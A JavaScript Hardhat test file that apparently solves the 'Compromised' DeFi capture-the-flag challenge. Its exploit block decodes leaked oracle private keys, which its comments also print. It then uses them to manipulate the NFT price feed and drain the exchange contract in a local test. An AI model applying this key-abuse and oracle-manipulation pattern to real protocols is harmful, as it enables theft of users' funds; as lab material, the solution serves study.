const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
		
		// First we parse the output of headers - HEX to TEXT
		const convert = (from, to) => str => Buffer.from(str, from).toString(to);
		const hexToUtf8 = convert('hex', 'utf8');
		
		let first_hex_code = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
		
		let second_hex_code = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
		
		first_hex_code = first_hex_code.replace(/\s/g, '');
		second_hex_code = second_hex_code.replace(/\s/g, '');
		
		// We get Base64 encoded string back, decoding base64 gives us private keys for oracles
		var oracle_1_private_key = Buffer.from(hexToUtf8(first_hex_code), 'base64').toString('utf-8');
		var oracle_2_private_key = Buffer.from(hexToUtf8(second_hex_code), 'base64').toString('utf-8');

		let oracle_1 = new ethers.Wallet(oracle_1_private_key, ethers.provider);
		let oracle_2 = new ethers.Wallet(oracle_2_private_key, ethers.provider);
		
		// console.log(oracle_1.address);
		
		// Address: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
		// Private key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
		
		// Address: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
		// Private key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
		
		// Set the price of oracles to 0
		var oracleABI = [
		{
			"inputs": [
				{
					"internalType": "address[]",
					"name": "sources",
					"type": "address[]"
				},
				{
					"internalType": "bool",
					"name": "enableInitialization",
					"type": "bool"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": true,
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"indexed": true,
					"internalType": "bytes32",
					"name": "previousAdminRole",
					"type": "bytes32"
				},
				{
					"indexed": true,
					"internalType": "bytes32",
					"name": "newAdminRole",
					"type": "bytes32"
				}
			],
			"name": "RoleAdminChanged",
			"type": "event"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": true,
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"indexed": true,
					"internalType": "address",
					"name": "account",
					"type": "address"
				},
				{
					"indexed": true,
					"internalType": "address",
					"name": "sender",
					"type": "address"
				}
			],
			"name": "RoleGranted",
			"type": "event"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": true,
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"indexed": true,
					"internalType": "address",
					"name": "account",
					"type": "address"
				},
				{
					"indexed": true,
					"internalType": "address",
					"name": "sender",
					"type": "address"
				}
			],
			"name": "RoleRevoked",
			"type": "event"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": true,
					"internalType": "address",
					"name": "source",
					"type": "address"
				},
				{
					"indexed": true,
					"internalType": "string",
					"name": "symbol",
					"type": "string"
				},
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "oldPrice",
					"type": "uint256"
				},
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "newPrice",
					"type": "uint256"
				}
			],
			"name": "UpdatedPrice",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "DEFAULT_ADMIN_ROLE",
			"outputs": [
				{
					"internalType": "bytes32",
					"name": "",
					"type": "bytes32"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "INITIALIZER_ROLE",
			"outputs": [
				{
					"internalType": "bytes32",
					"name": "",
					"type": "bytes32"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "TRUSTED_SOURCE_ROLE",
			"outputs": [
				{
					"internalType": "bytes32",
					"name": "",
					"type": "bytes32"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "symbol",
					"type": "string"
				}
			],
			"name": "getAllPricesForSymbol",
			"outputs": [
				{
					"internalType": "uint256[]",
					"name": "",
					"type": "uint256[]"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "symbol",
					"type": "string"
				}
			],
			"name": "getMedianPrice",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "getNumberOfSources",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "symbol",
					"type": "string"
				},
				{
					"internalType": "address",
					"name": "source",
					"type": "address"
				}
			],
			"name": "getPriceBySource",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				}
			],
			"name": "getRoleAdmin",
			"outputs": [
				{
					"internalType": "bytes32",
					"name": "",
					"type": "bytes32"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"internalType": "uint256",
					"name": "index",
					"type": "uint256"
				}
			],
			"name": "getRoleMember",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				}
			],
			"name": "getRoleMemberCount",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"internalType": "address",
					"name": "account",
					"type": "address"
				}
			],
			"name": "grantRole",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"internalType": "address",
					"name": "account",
					"type": "address"
				}
			],
			"name": "hasRole",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "symbol",
					"type": "string"
				},
				{
					"internalType": "uint256",
					"name": "newPrice",
					"type": "uint256"
				}
			],
			"name": "postPrice",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"internalType": "address",
					"name": "account",
					"type": "address"
				}
			],
			"name": "renounceRole",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes32",
					"name": "role",
					"type": "bytes32"
				},
				{
					"internalType": "address",
					"name": "account",
					"type": "address"
				}
			],
			"name": "revokeRole",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address[]",
					"name": "sources",
					"type": "address[]"
				},
				{
					"internalType": "string[]",
					"name": "symbols",
					"type": "string[]"
				},
				{
					"internalType": "uint256[]",
					"name": "prices",
					"type": "uint256[]"
				}
			],
			"name": "setupInitialPrices",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "bytes4",
					"name": "interfaceId",
					"type": "bytes4"
				}
			],
			"name": "supportsInterface",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "view",
			"type": "function"
		}
	]
	
	oracle_1.connect(ethers.provider);
	oracle_2.connect(ethers.provider);
	
	// Set the prices to 0 so we can buy a bunch
	await this.oracle.connect(oracle_1).postPrice("DVNFT", ethers.utils.parseEther("0.001"));
	await this.oracle.connect(oracle_2).postPrice("DVNFT", ethers.utils.parseEther("0.001"));

	// Check the current prices for the oracles
	let getCurrentPrices = await this.oracle.getAllPricesForSymbol("DVNFT");
	
	// Print values
	for (let i = 0; i < getCurrentPrices.length; i++) {
		console.log("Price [" + i + "]: " + ethers.utils.formatEther(getCurrentPrices[i]) + " ETH");
	}
	
	// Get the median price
	let getMedianPrice = await this.oracle.getMedianPrice("DVNFT");
	
	console.log("Current median price: " + ethers.utils.formatEther(getMedianPrice) + " ETH");
	
	// Buy 10 NFTs so we can drain the pool
	for (let i = 0; i < 10; i++) {
		
		// Value of ether needs to be greater than 0, so we send at least 1 wei to the exchange contract
		
		let token_id = await this.exchange.connect(attacker).buyOne({
			value: ethers.utils.parseEther("0.001") // wei
		});
		
		// Set approval for future selling of the NFTs
		await this.nftToken.connect(attacker).approve(this.exchange.address, i);
		
	}
	
	console.log("Approved");
	
	// Set the price back to 999 ether
	await this.oracle.connect(oracle_1).postPrice("DVNFT", ethers.utils.parseEther("999"));
	await this.oracle.connect(oracle_2).postPrice("DVNFT", ethers.utils.parseEther("999"));
	
	// Sell the 10 NFTs for profit
	
	for (let i = 0; i < 10; i++) {
		
		// Value of ether needs to be greater than 0, so we send 1 wei to exchange contract
		if (i < 9) {
			await this.exchange.connect(attacker).sellOne(i);
		}
		else {
			// Last NFT, we need to drain the 0.01 we sent to the exchange contract as well (10x 0.01 eth)
			
			// Set the price to 999.01 ether
			await this.oracle.connect(oracle_1).postPrice("DVNFT", ethers.utils.parseEther("999.01"));
			await this.oracle.connect(oracle_2).postPrice("DVNFT", ethers.utils.parseEther("999.01"));
			
			await this.exchange.connect(attacker).sellOne(i);
			
			// This of course could have been done in single TX with only 1 NFT, feel free to enhance this exploit
			
		}
		
		
	}
	
	// Reset price
	await this.oracle.connect(oracle_1).postPrice("DVNFT", ethers.utils.parseEther("999"));
	
		
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
